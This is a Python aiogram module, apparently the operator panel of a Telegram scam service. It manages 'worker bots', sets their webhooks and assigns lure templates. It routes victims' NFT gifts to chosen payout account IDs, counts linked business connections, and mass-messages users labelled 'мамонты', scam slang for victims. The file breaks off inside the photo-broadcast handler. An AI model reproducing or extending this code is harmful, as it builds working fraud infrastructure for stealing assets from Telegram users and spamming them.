import asyncio
import datetime
import os
import re

from asyncio import Semaphore, sleep, gather

from aiogram import Bot, F, Router, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    CopyTextButton,
)
from sqlalchemy import and_, delete, func, or_, select, update
from sqlalchemy.orm import selectinload

from base_templates.registry import BASE_TEMPLATES, BASE_TEMPLATES_MAP
from bot_notify import notify_admins_bot_added
from cache import (
    add_token_for_port,
    get_token_port,
    invalidate_template_cache,
    remove_token_from_port,
)
from config import OWNER_ACCOUNT_ID, PANEL_OWNERS, WEBHOOK_HOST
from db import Session
from imgbb_api import upload_image_from_file
from models import (
    Admin,
    BusinessConnection,
    CustomGift,
    Template,
    UserGiftHistory,
    WorkerBot,
    WorkerBotUser,
)
from worker_ports import get_least_loaded_port

router = Router()

ITEMS_PER_PAGE = 8
MAMONTY_PER_PAGE = 10  
TEMP_IMG_DIR = "temp_images"

if not os.path.exists(TEMP_IMG_DIR):
    os.makedirs(TEMP_IMG_DIR)

class AddBot(StatesGroup):
    waiting_token = State()
    waiting_template = State()
    waiting_nft_target = State()

class SpamBot(StatesGroup):
    waiting_text = State()
    confirm_photo = State()
    waiting_photo = State()

class InlinePreviewState(StatesGroup):
    waiting_nft = State()
    waiting_button_text = State()
    waiting_message_text = State()

class MamontyStates(StatesGroup):
    waiting_user_id = State()
    waiting_message = State()
    waiting_block_user_id = State()
    waiting_unblock_user_id = State()

class MamontySearchState(StatesGroup):
    waiting_query = State()
    waiting_message = State()

@router.message(F.text == "🤖 Боты")
async def show_bots_menu_message(message: types.Message, state: FSMContext):
    if message.chat.type != "private":
        await message.answer("⛔ Доступно только в личке с ботом.")
        return

    await show_bots_menu_common(message, message.from_user.id, state)

@router.callback_query(F.data.startswith("show_bots_menu_"))
async def paginate_bots(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_bots_menu_common(callback, callback.from_user.id, state, page=0)

async def show_bots_menu_common(target, tg_id: int, state: FSMContext, page: int = 0):
    await state.clear()
    MAX_BOTS_PER_ADMIN = 15

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            text = "Профиль не найден"
            if isinstance(target, types.CallbackQuery):
                await target.message.edit_text(text)
                await target.answer()
            else:
                await target.answer(text)
            return

        bots = (
            await session.execute(
                select(WorkerBot)
                .where(WorkerBot.owner_id == admin.id)
                .options(selectinload(WorkerBot.template))
                .limit(MAX_BOTS_PER_ADMIN)
            )
        ).scalars().all()

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()
        total_mamonty = 0
        if bots_ids:
            total_mamonty = (await session.execute(
                select(func.count(func.distinct(WorkerBotUser.telegram_id)))
                .where(WorkerBotUser.worker_bot_id.in_(bots_ids))
            )).scalar() or 0

        total_users = (await session.execute(
            select(func.count(WorkerBotUser.id))
            .join(WorkerBot, WorkerBot.id == WorkerBotUser.worker_bot_id)
            .where(WorkerBot.owner_id == admin.id)
        )).scalar() or 0

        total_all_connections = (await session.execute(
            select(func.count(BusinessConnection.id))
            .where(BusinessConnection.admin_id == admin.id)
        )).scalar() or 0

        total_active_connections = (await session.execute(
            select(func.count(BusinessConnection.id))
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        )).scalar() or 0

        result = await session.execute(
            select(
                func.sum(WorkerBot.launches),
                func.sum(WorkerBot.premium_launches),
                func.count(WorkerBot.id)
            ).where(WorkerBot.owner_id == admin.id)
        )
        total_launches, total_premium_launches, total_bots = result.one()
        total_launches = total_launches or 0
        total_premium_launches = total_premium_launches or 0
        total_bots = total_bots or 0

    bot_buttons = []
    row = []
    for bot in bots:
        text = f"@{bot.username}" if bot.username else bot.name
        row.append(InlineKeyboardButton(text=text, callback_data=f"bot_{bot.id}"))
        if len(row) == 3:
            bot_buttons.append(row)
            row = []
    if row:
        bot_buttons.append(row)

    add_bot_text = f"Добавить бота ({total_bots}/{MAX_BOTS_PER_ADMIN})"
    add_bot_btn = [InlineKeyboardButton(text=add_bot_text, callback_data="add_bot")]
    mamonty_btn = [InlineKeyboardButton(text=f"Мамонты ({total_mamonty})", callback_data="show_mamonty")]

    kb_buttons = [add_bot_btn, mamonty_btn] + bot_buttons
    kb = InlineKeyboardMarkup(inline_keyboard=kb_buttons)

    text = (
        f"<b>🤖 Боты</b>\n\n"
        f"<i>📌 Создай личного бота через <b>@BotFather</b> и добавь его.</i>\n\n"
        f"<b>🎈 Общая статистика:</b>\n"
        f"<blockquote>"
        f"<b>🙆🏻‍♀️ Мамонты: {total_users}</b>\n"
        f"<b>💎 Премиум: {total_premium_launches}</b>\n"
        f"<b>🎯 Подключений: {total_all_connections}</b>\n"
        f"<b>🟢 Активные: {total_active_connections}</b>\n"
        f"</blockquote>"
    )

    if isinstance(target, types.CallbackQuery):
        await target.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
        await target.answer()
    else:
        await target.answer(text, reply_markup=kb, parse_mode="HTML")

@router.callback_query(F.data == "add_bot")
async def cb_add_bot(callback: types.CallbackQuery, state: FSMContext):
    MAX_BOTS_PER_ADMIN = 15
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = (
            select(Admin)
            .options(selectinload(Admin.settings))
            .where(Admin.telegram_id == tg_id)
        )
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        bot_count = 0
        if admin:
            res = await session.execute(
                select(func.count(WorkerBot.id)).where(WorkerBot.owner_id == admin.id)
            )
            bot_count = res.scalar() or 0

        if bot_count >= MAX_BOTS_PER_ADMIN:
            await callback.answer(
                f"❌ Лимит: {MAX_BOTS_PER_ADMIN} ботов. Больше добавить нельзя.",
                show_alert=True
            )
            return

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.answer(
                "⚠️ Перед добавлением бота необходимо подключить передачу в настройках.",
                show_alert=True
            )
            return

    await state.set_state(AddBot.waiting_token)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ])

    await callback.message.edit_text(
        "<b>🔑 Отправь токен бота:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(AddBot.waiting_token)
async def save_token(message: types.Message, state: FSMContext):
    token = message.text.strip()
    tg_id = message.from_user.id

    new_bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
    try:
        me = await new_bot.get_me()
        async with Session() as session:
            result = await session.execute(select(Admin).where(Admin.telegram_id == tg_id))
            admin = result.scalar_one_or_none()
            if not admin:
                admin = Admin(telegram_id=tg_id, username=message.from_user.username)
                session.add(admin)
                await session.commit()

            bot_count = await session.scalar(
                select(func.count(WorkerBot.id)).where(WorkerBot.owner_id == admin.id)
            )
            if bot_count >= 15: 
                await message.answer(
                    "❌ Достигнут лимит: нельзя добавить больше 15 ботов.",
                    parse_mode="HTML",
                    show_alert=True
                )
                return

            admin_settings = await session.scalar(
                select(Admin).options(selectinload(Admin.settings)).where(Admin.id == admin.id)
            )
            if not admin_settings.settings or not admin_settings.settings.payout_ids:
                await message.answer(
                    "⚠️ Сначала настройте аккаунты для передачи в настройках.",
                    parse_mode="HTML",
                    show_alert=True
                )
                return

            server_port = await get_least_loaded_port(session)
            webhook_url = f"{WEBHOOK_HOST}/worker_webhook_{server_port}/{token}"

            try:
                await new_bot.set_webhook(url=webhook_url)
                print(f"[Port:{server_port}] Вебхук установлен для бота {token}")
            except Exception as e:
                print(f"[Port:{server_port}] Ошибка установки вебхука для токена {token}: {e}")
                await message.answer(
                    "❌ Ошибка при добавлении бота. Проверьте токен и попробуйте снова.",
                    parse_mode="HTML"
                )
                return

            new_worker_bot = WorkerBot(
                token=token,
                name=me.full_name,
                telegram_id=me.id,
                username=me.username,
                owner_id=admin.id,
                server_port=server_port
            )
            session.add(new_worker_bot)
            await session.commit()
            print(f"[Port:{server_port}] Бот @{me.username} добавлен в базу с ID {new_worker_bot.id}")

            await add_token_for_port(server_port, token)
            await notify_admins_bot_added(new_worker_bot)

            await state.update_data(worker_bot_id=new_worker_bot.id, server_port=server_port)
            await state.set_state(AddBot.waiting_template)

            result = await session.execute(
                select(Template)
                .where(Template.owner_id == admin.id)
                .order_by(Template.name)
            )
            custom_templates = result.scalars().all()

            all_templates = [
                *custom_templates,
                *BASE_TEMPLATES
            ]

            if not all_templates:
                await message.answer(
                    "⚠️ У вас нет доступных шаблонов. Сначала создайте шаблон.",
                    parse_mode="HTML"
                )
                await state.clear()
                return

            kb = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text=f"🌐 {t.name}" if hasattr(t, "id") and str(t.id).startswith("base_") else t.name,
                            callback_data=f"choose_tpl_{t.id}"
                        )
                    ]
                    for t in all_templates
                ]
            )

            await message.answer(
                "<b>📎 Выберите шаблон, который будет использовать бот:</b>",
                reply_markup=kb,
                parse_mode="HTML"
            )

    except Exception as e:
        print(f"[Port:{server_port}] Общая ошибка добавления бота для токена {token}: {e}")
        await message.answer(
            "❌ Ошибка при добавлении бота. Проверьте токен и попробуйте снова.",
            parse_mode="HTML"
        )

    finally:
        await new_bot.session.close()


@router.callback_query(lambda c: c.data.startswith("choose_tpl_"))
async def assign_template_and_choose_target(callback: types.CallbackQuery, state: FSMContext):
    template_id = callback.data.split("_", 2)[-1]
    data = await state.get_data()
    bot_id = data.get("worker_bot_id")
    tg_id = callback.from_user.id

    async with Session() as session:
        bot = await session.get(WorkerBot, bot_id)
        if bot:
            if str(template_id).startswith("base_"):
                bot.base_template_id = template_id
                bot.template_id = None  
            else:
                bot.template_id = int(template_id)
                bot.base_template_id = None  
            await session.commit()

        stmt = select(Admin).options(selectinload(Admin.settings)).where(Admin.telegram_id == tg_id)
        result = await session.execute(stmt)
        admin = result.scalar_one_or_none()

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.message.edit_text(
                "⚠️ У вас не настроены аккаунты для передачи. Добавьте их в настройках.",
                parse_mode="HTML"
            )
            await state.clear()
            return

        payout_ids = admin.settings.payout_ids.split(",")

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"ID: {pid.strip()}", callback_data=f"set_nft_target_{pid.strip()}")]
            for pid in payout_ids if pid.strip()
        ]
    )

    await callback.message.edit_text(
        "<b>📦 Выберите аккаунт, куда будет передаваться NFT:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )

    await state.set_state(AddBot.waiting_nft_target)
    await callback.answer()

@router.callback_query(F.data.startswith("set_nft_target_"))
async def set_nft_target(callback: types.CallbackQuery, state: FSMContext):
    target_id = int(callback.data.split("_")[-1])
    data = await state.get_data()
    bot_id = data.get("worker_bot_id")

    async with Session() as session:
        bot = await session.get(WorkerBot, bot_id)
        if bot:
            bot.nft_transfer_to_id = target_id
            await session.commit()

    await callback.answer("✅ Аккаунт привязан!", show_alert=True)

    await show_bots_menu_common(callback, callback.from_user.id, state)
    await state.clear()

async def show_bot_info_message(chat_id: int, bot_id: int):
    async with Session() as session:
        stmt = (
            select(WorkerBot)
            .where(
                WorkerBot.id == bot_id,
                WorkerBot.owner.has(telegram_id=chat_id)
            )
            .options(selectinload(WorkerBot.template), selectinload(WorkerBot.custom_template))
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            return

        active_conn_stmt = select(func.count()).where(
            BusinessConnection.worker_bot_id == bot.id,
            BusinessConnection.is_connected == True
        )
        active_connections = (await session.execute(active_conn_stmt)).scalar_one()

    if bot.base_template_id:
        template_name = BASE_TEMPLATES_MAP.get(bot.base_template_id).name if BASE_TEMPLATES_MAP.get(bot.base_template_id) else "не найден"
    elif bot.template:
        template_name = bot.template.name
    else:
        template_name = "не установлен"

    template_info = f"<b>📎 Шаблон:</b> <b>{template_name}</b>"

    inlain_info = (
        f"<b>⚡️ Шаблон Inlain Mod:</b> <b>{bot.custom_template.template_name}</b>"
        if bot.custom_template else
        "<b>⚡️ Шаблон Inlain Mod:</b> не подключен"
    )

    nft_target_info = (
        f"<b>📤 Передача NFT идёт на ID:</b> <code>{bot.nft_transfer_to_id}</code>"
        if bot.nft_transfer_to_id else
        "<b>📤 Передача NFT не настроена</b>"
    )

    ref_url = f"https://t.me/{bot.username}?start=ref_{bot.owner_id}"
    ref_text = f"<b>🔗 Реферальная ссылка:</b>\n<code>{ref_url}</code>"

    text = (
        f"<b>📍 Информация о боте</b>\n\n"
        f"🤖 <b>Бот:</b> <b>@{bot.username}</b>\n"
        f"🔑 <b>Token:</b> <code>{bot.token}</code>\n\n"
        f"<blockquote>"
        f"🚀 <b>Запуски:</b> <code>{bot.launches}</code>\n"
        f"💎 <b>Премиум-запуски:</b> <code>{bot.premium_launches}</code>\n"
        f"🎯 <b>Подключения:</b> <code>{bot.connection_count}</code>\n"
        f"🟢 <b>Активные подключения:</b> <code>{active_connections}</code>"
        f"</blockquote>\n\n"
        f"{template_info}\n"
        f"{inlain_info}\n"
        f"{nft_target_info}\n\n"
        f"{ref_text}"
    )

    keyboard = [
        [InlineKeyboardButton(text="Перезапустить бота", callback_data=f"clear_templates_cache_{bot.id}")],
        [
            InlineKeyboardButton(text="Обновить", callback_data=f"bot_refresh_{bot.id}"),
            InlineKeyboardButton(text="Подключить Inline", callback_data=f"connect_inline_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Изменить шаблон", callback_data=f"bot_change_template_{bot.id}"),
            InlineKeyboardButton(text="Изменить передачу", callback_data=f"bot_change_transfer_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Проспамить", callback_data=f"bot_spam_{bot.id}"),
            InlineKeyboardButton(text="Удалить бота", callback_data=f"bot_confirm_delete_{bot.id}")
        ],
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=keyboard)

    from loader import bot as tg_bot
    await tg_bot.send_message(chat_id=chat_id, text=text, reply_markup=kb, parse_mode="HTML")


@router.callback_query(
    F.data.startswith("bot_")
    & ~F.data.startswith("bot_confirm_delete_")
    & ~F.data.startswith("bot_delete_")
    & ~F.data.startswith("bot_spam_")
    & ~F.data.startswith("bot_change_template_")
    & ~F.data.startswith("bot_change_transfer_")
    & ~F.data.startswith("connect_inline_")
)
async def show_bot_info(callback: types.CallbackQuery):
    data = callback.data
    is_refresh = data.startswith("bot_refresh_")
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        ).options(selectinload(WorkerBot.template), selectinload(WorkerBot.custom_template))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("Бот не найден", show_alert=True)
            return

        active_conn_stmt = select(func.count()).where(
            BusinessConnection.worker_bot_id == bot.id,
            BusinessConnection.is_connected == True
        )
        active_connections = (await session.execute(active_conn_stmt)).scalar_one()

    if bot.base_template_id:
        template_name = BASE_TEMPLATES_MAP.get(bot.base_template_id).name if BASE_TEMPLATES_MAP.get(bot.base_template_id) else "не найден"
    elif bot.template:
        template_name = bot.template.name
    else:
        template_name = "не установлен"

    template_info = f"<b>📎 Шаблон:</b> <b>{template_name}</b>"

    inlain_info = (
        f"<b>⚡️ Шаблон Inlain Mod:</b> <b>{bot.custom_template.template_name}</b>"
        if bot.custom_template else
        "<b>⚡️ Шаблон Inlain Mod:</b> не подключен"
    )
    nft_target_info = (
        f"<b>📤 Передача NFT идёт на ID:</b> <code>{bot.nft_transfer_to_id}</code>"
        if bot.nft_transfer_to_id else
        "<b>📤 Передача NFT не настроена</b>"
    )

    ref_url = f"https://t.me/{bot.username}?start=ref_{bot.owner_id}"
    ref_text = f"<b>🔗 Реферальная ссылка:</b>\n<code>{ref_url}</code>"

    text = (
        f"<b>📍 Информация о боте</b>\n\n"
        f"🤖 <b>Бот:</b> <b>@{bot.username}</b>\n"
        f"🔑 <b>Token:</b> <code>{bot.token}</code>\n\n"
        f"<blockquote>"
        f"🚀 <b>Запуски:</b> <code>{bot.launches}</code>\n"
        f"💎 <b>Премиум-запуски:</b> <code>{bot.premium_launches}</code>\n"
        f"🎯 <b>Подключения:</b> <code>{bot.connection_count}</code>\n"
        f"🟢 <b>Активные подключения:</b> <code>{active_connections}</code>"
        f"</blockquote>\n\n"
        f"{template_info}\n"
        f"{inlain_info}\n"
        f"{nft_target_info}\n\n"
        f"{ref_text}"
    )

    keyboard = [
        [InlineKeyboardButton(text="Перезапустить бота", callback_data=f"clear_templates_cache_{bot.id}")],
        [
            InlineKeyboardButton(text="Обновить", callback_data=f"bot_refresh_{bot.id}"),
            InlineKeyboardButton(text="Подключить Inline", callback_data=f"connect_inline_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Изменить шаблон", callback_data=f"bot_change_template_{bot.id}"),
            InlineKeyboardButton(text="Изменить передачу", callback_data=f"bot_change_transfer_{bot.id}")
        ],
        [
            InlineKeyboardButton(text="Проспамить", callback_data=f"bot_spam_{bot.id}"),
            InlineKeyboardButton(text="Удалить бота", callback_data=f"bot_confirm_delete_{bot.id}")
        ],
        [InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")]
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=keyboard)

    try:
        if is_refresh:
            await callback.message.delete()
            await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
        else:
            await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest:
        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")

    await callback.answer()


@router.callback_query(F.data.startswith("clear_templates_cache_"))
async def clear_templates_cache(callback: types.CallbackQuery):
    try:
        bot_id = int(callback.data.split("_")[-1])
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Ошибка в данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        ).options(selectinload(WorkerBot.template))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()
        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        if not bot.template_id:
            await callback.answer("Бот перезапущен!", show_alert=True)
            return

        stmt_same_tpl = select(WorkerBot).where(
            WorkerBot.owner_id == bot.owner_id,
            WorkerBot.template_id == bot.template_id
        )
        result_same_tpl = await session.execute(stmt_same_tpl)
        bots_same_tpl = result_same_tpl.scalars().all()

        await invalidate_template_cache(bot.template_id, bot.owner_id)
        print(f"[CACHE] DROP for template {bot.template_id} admin {bot.owner_id} (сброшено для {len(bots_same_tpl)} ботов владельца)")

    await callback.answer(
        f"Бот перезапущен!",
        show_alert=True
    )

@router.callback_query(F.data.startswith("connect_inline_"))
async def connect_inline_handler(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("❌ Профиль не найден", show_alert=True)
            return

        result = await session.execute(
            select(CustomGift).where(CustomGift.admin_id == admin.id)
        )
        custom_gifts = result.scalars().all()

    buttons = [
        [InlineKeyboardButton(text=gift.template_name, callback_data=f"set_inline_tpl_{gift.id}")]
        for gift in custom_gifts
    ]
    buttons.append([InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")])

    kb = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.edit_text(
        "<b>🔗 Выберите инлайн-шаблон для подключения:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("set_inline_tpl_"))
async def set_inline_template(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    gift_id = int(parts[-1])
    bot_id = int(callback.message.reply_markup.inline_keyboard[-1][0].callback_data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("❌ Профиль не найден", show_alert=True)
            return

        custom_gift = await session.get(CustomGift, gift_id)
        if not custom_gift or custom_gift.admin_id != admin.id:
            await callback.answer("❌ Шаблон не найден", show_alert=True)
            return

        bot = await session.get(WorkerBot, bot_id)
        if not bot or bot.owner_id != admin.id:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.custom_template_id = custom_gift.id
        await session.commit()

    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)
    await callback.answer("✅ Инлайн-шаблон подключён!")

@router.callback_query(F.data.startswith("bot_change_template_"))
async def change_bot_template(callback: types.CallbackQuery):
    try:
        parts = callback.data.split("_")
        bot_id = int(parts[-1])
        page = int(parts[-2]) if len(parts) > 3 else 1
    except Exception:
        bot_id = int(callback.data.split("_")[-1])
        page = 1

    tg_id = callback.from_user.id

    async with Session() as session:
        admin = (await session.execute(select(Admin).where(Admin.telegram_id == tg_id))).scalar_one_or_none()
        if not admin:
            await callback.answer("❌ Ошибка: вы не зарегистрированы.", show_alert=True)
            return

        stmt = (
            select(Template)
            .where(Template.owner_id == admin.id)
            .order_by(Template.name)
        )
        result = await session.execute(stmt)
        custom_templates = result.scalars().all() if result else []

        base_templates = list(BASE_TEMPLATES_MAP.values())

        all_templates = [
            {"type": "base", "id": tpl.id, "name": f"🌐 {tpl.name}"} for tpl in base_templates
        ] + [
            {"type": "custom", "id": tpl.id, "name": tpl.name} for tpl in custom_templates
        ]

        total = len(all_templates)
        if total == 0:
            await callback.answer("⚠️ У вас нет доступных шаблонов", show_alert=True)
            return

        total_pages = (total + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
        page = max(1, min(page, total_pages))
        start_idx = (page - 1) * ITEMS_PER_PAGE
        end_idx = start_idx + ITEMS_PER_PAGE
        page_templates = all_templates[start_idx:end_idx]

    kb = []
    for t in page_templates:
        if t["type"] == "base":
            kb.append([
                InlineKeyboardButton(
                    text=t["name"],
                    callback_data=f"reassign_tpl_base_{bot_id}_{t['id']}"
                )
            ])
        else:
            kb.append([
                InlineKeyboardButton(
                    text=t["name"],
                    callback_data=f"reassign_tpl_custom_{bot_id}_{t['id']}"
                )
            ])

    nav = [
        InlineKeyboardButton(
            text="<",
            callback_data=f"bot_change_template_{page-1}_{bot_id}" if page > 1 else "noop"
        ),
        InlineKeyboardButton(
            text=f"{page}/{total_pages}",
            callback_data="noop"
        ),
        InlineKeyboardButton(
            text=">",
            callback_data=f"bot_change_template_{page+1}_{bot_id}" if page < total_pages else "noop"
        )
    ]
    kb.append(nav)
    kb.append([InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")])

    await callback.message.edit_text(
        "<b>📎 Выберите новый шаблон для бота:</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb),
        parse_mode="HTML"
    )
    await callback.answer()


@router.callback_query(F.data == "noop")
async def noop_callback(callback: CallbackQuery):
    await callback.answer()


@router.callback_query(F.data.startswith("reassign_tpl_base_"))
async def reassign_template_base(callback: types.CallbackQuery, state: FSMContext):
    try:
        _, _, _, bot_id_str, base_template_id = callback.data.split("_", 4)
        bot_id = int(bot_id_str)
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Неверный формат данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.template_id = None         
        bot.base_template_id = base_template_id
        await session.commit()

    await callback.answer("✅ Базовый шаблон успешно выбран.", show_alert=True)
    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)


@router.callback_query(F.data.startswith("reassign_tpl_custom_"))
async def reassign_template_custom(callback: types.CallbackQuery, state: FSMContext):
    try:
        _, _, _, bot_id_str, template_id_str = callback.data.split("_", 4)
        bot_id = int(bot_id_str)
        template_id = int(template_id_str)
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Неверный формат данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.base_template_id = None  
        bot.template_id = template_id
        await session.commit()

        await invalidate_template_cache(template_id, bot.owner_id)
        print(f"[CACHE] Сброшен кеш для шаблона {template_id} admin {bot.owner_id}")

    await callback.answer("✅ Шаблон успешно изменён.", show_alert=True)
    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)

@router.callback_query(F.data.startswith("bot_confirm_delete_"))
async def confirm_delete_bot(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("Бот не найден", show_alert=True)
            return

    text = (
        f"<b>⚠️ Вы точно хотите удалить бота @{bot.username}?\n"
        f"Действие необратимо.</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Да", callback_data=f"bot_delete_{bot.id}"),
            InlineKeyboardButton(text="Нет", callback_data=f"bot_{bot.id}")
        ]
    ])

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data.startswith("bot_delete_"))
async def delete_bot(callback: types.CallbackQuery, state: FSMContext):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot_data = result.scalar_one_or_none()

        if not bot_data:
            await callback.answer("Бот не найден", show_alert=True)
            return

        try:
            worker_bot = Bot(token=bot_data.token, default=DefaultBotProperties(parse_mode="HTML"))
            await worker_bot.delete_webhook(drop_pending_updates=True)
            await worker_bot.session.close()
        except Exception as e:
            print(f"[DELETE_WEBHOOK_ERROR] {e} (всё равно удаляем из БД)")

        try:
            token = bot_data.token
            port = await get_token_port(token)
            if port:
                await remove_token_from_port(port, token)
        except Exception as e:
            print(f"[REDIS_DELETE_ERROR] {e}")

        try:
            user_ids_result = await session.execute(
                select(WorkerBotUser.id).where(WorkerBotUser.worker_bot_id == bot_data.id)
            )
            user_ids = [row[0] for row in user_ids_result.all()]
            if user_ids:
                await session.execute(
                    delete(UserGiftHistory).where(UserGiftHistory.user_id.in_(user_ids))
                )

            await session.execute(
                delete(BusinessConnection).where(BusinessConnection.worker_bot_id == bot_data.id)
            )

            await session.execute(
                update(WorkerBotUser)
                .where(WorkerBotUser.worker_bot_id == bot_data.id)
                .values(worker_bot_id=None)
            )

            await session.delete(bot_data)
            await session.commit()
        except Exception as e:
            print(f"[DB_DELETE_ERROR] {e}")

    await callback.answer("✅ Бот успешно удалён.", show_alert=True)
    await show_bots_menu_common(callback, tg_id, state)

@router.callback_query(F.data.startswith("back_from_spam_"))
async def back_from_spam_to_bot(callback: types.CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if current_state == SpamBot.waiting_text.state:
        await state.clear()

    bot_id = int(callback.data.split("_")[-1])

    try:
        await callback.message.delete()
    except Exception:
        pass

    await show_bot_info_message(callback.from_user.id, bot_id)

    await callback.answer()

@router.callback_query(F.data.startswith("bot_spam_"))
async def start_spam_prompt(callback: types.CallbackQuery, state: FSMContext):
    bot_id = int(callback.data.split("_")[-1])

    await state.set_state(SpamBot.waiting_text)
    await state.update_data(bot_id=bot_id)

    text = (
        "<b>✉️ Введите текст рассылки для пользователей бота</b>\n\n"
        "<b>Вы можете использовать любое форматирование текста.</b>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data=f"back_from_spam_{bot_id}")]
    ])

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@router.message(SpamBot.waiting_text)
async def handle_spam_text(message: types.Message, state: FSMContext):
    if message.content_type != "text":
        await message.answer(
            "<b>❌ Ошибка:</b> Только текст разрешён для рассылки.\n"
            "Пожалуйста, отправьте обычное сообщение с текстом.",
            parse_mode="HTML"
        )
        return
    await state.update_data(spam_text=message.html_text)
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Да", callback_data="spam_photo_yes"),
             InlineKeyboardButton(text="Нет", callback_data="spam_photo_no")]
        ]
    )
    await state.set_state(SpamBot.confirm_photo)
    await message.answer(
        "<b>Добавить к рассылке фото?</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )

@router.callback_query(F.data == "spam_photo_no", SpamBot.confirm_photo)
async def spam_no_photo(cb: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    bot_id = data["bot_id"]
    spam_text = data["spam_text"]
    await state.clear()
    await cb.message.answer("<b>✅ Рассылка запустилась, ожидайте статистику.</b>", parse_mode="HTML")
    asyncio.create_task(run_spam_in_background(bot_id, spam_text))

@router.callback_query(F.data == "spam_photo_yes", SpamBot.confirm_photo)
async def spam_yes_photo(cb: types.CallbackQuery, state: FSMContext):
